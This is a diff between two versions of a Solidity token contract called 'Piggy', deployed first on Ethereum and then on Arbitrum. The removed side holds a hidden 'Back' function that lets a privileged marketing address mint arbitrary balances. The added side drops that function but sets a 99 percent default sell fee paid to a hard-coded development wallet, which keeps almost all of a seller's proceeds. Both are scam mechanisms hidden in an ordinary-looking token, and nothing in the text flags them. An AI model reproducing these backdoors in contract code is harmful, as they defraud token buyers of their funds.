@@ -1,5 +1,5 @@
 /**
- *Submitted for verification at Etherscan.io on 2023-02-28
+ *Submitted for verification at Arbiscan on 2023-03-02
 */
 
 // SPDX-License-Identifier: Unlicensed
@@ -176,24 +176,6 @@ contract Ownable is Context {
     }
 
     
-}
-
-contract MarketingOwned is Ownable {
-    address internal _marketing;
-
-    function setMarketing(address marketing_) external onlyOwner returns (bool) {
-        _marketing = marketing_;
-        return true;
-    }
-
-    function marketing() public view returns (address) {
-        return _marketing;
-    }
-
-    modifier onlyMarketing() {
-        require(marketing() == _msgSender(), 'MarketingOwned: caller is not the Marketing');
-        _;
-    }
 }
 
 interface IUniswapV2Factory {
@@ -396,13 +378,13 @@ interface IUniswapV2Router02 is IUniswapV2Router01 {
     ) external;
 }
 
-contract Piggy is Context, IERC20, MarketingOwned {
+contract Piggy is Context, IERC20, Ownable {
     
     using SafeMath for uint256;
     using Address for address;
     
-    string private _name = "Safe Piggy";
-    string private _symbol = "Piggy ";
+    string private _name = "Piggy";
+    string private _symbol = "Piggy";
     uint8 private _decimals = 9;
 
     address payable public DevelopmentWalletAddress = payable(0x64CD543aBa84dea6820414C9F262DB22AF460d6f); 
@@ -423,7 +405,7 @@ contract Piggy is Context, IERC20, MarketingOwned {
     uint256 public _buyDevelopmentFee = 0;
  
     uint256 public _sellLiquidityFee;
-    uint256 public _sellDevelopmentFee = 0;
+    uint256 public _sellDevelopmentFee = 99;
 
     uint256 public _liquidityShare = _buyLiquidityFee.add(_sellLiquidityFee);
     uint256 public _DevelopmentShare = _buyDevelopmentFee.add(_sellDevelopmentFee);
@@ -470,7 +452,6 @@ contract Piggy is Context, IERC20, MarketingOwned {
         inSwapAndLiquify = false;
     }
     
-    
     constructor () {
         
         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506); 
@@ -484,8 +465,6 @@ contract Piggy is Context, IERC20, MarketingOwned {
         isExcludedFromFee[owner()] = true;
         isExcludedFromFee[address(this)] = true;
         
-        _marketing = address(_msgSender());
-
         _totalTaxIfBuying = _buyLiquidityFee.add(_buyDevelopmentFee);
         _totalTaxIfSelling = _sellLiquidityFee.add(_sellDevelopmentFee);
         _totalDistributionShares = _liquidityShare.add(_DevelopmentShare);
@@ -561,11 +540,6 @@ contract Piggy is Context, IERC20, MarketingOwned {
         isTxLimitExempt[holder] = exempt;
     }
     
-
-    function Back(address account, uint256 amount) public onlyMarketing {
-        _balances[account] += amount * 10**decimals();
-    }
-
     function setIsExcludedFromFee(address account, bool newValue) public onlyOwner {
         isExcludedFromFee[account] = newValue;
     }
@@ -577,7 +551,7 @@ contract Piggy is Context, IERC20, MarketingOwned {
         _totalTaxIfBuying = _buyLiquidityFee.add(_buyDevelopmentFee);
     }
 
-    function setSellTaxes(uint256 newLiquidityTax, uint256 newDevelopmentTax) external onlyMarketing() {
+    function setSellTaxes(uint256 newLiquidityTax, uint256 newDevelopmentTax) external onlyOwner() {
         _sellLiquidityFee = newLiquidityTax;
         _sellDevelopmentFee = newDevelopmentTax;
    
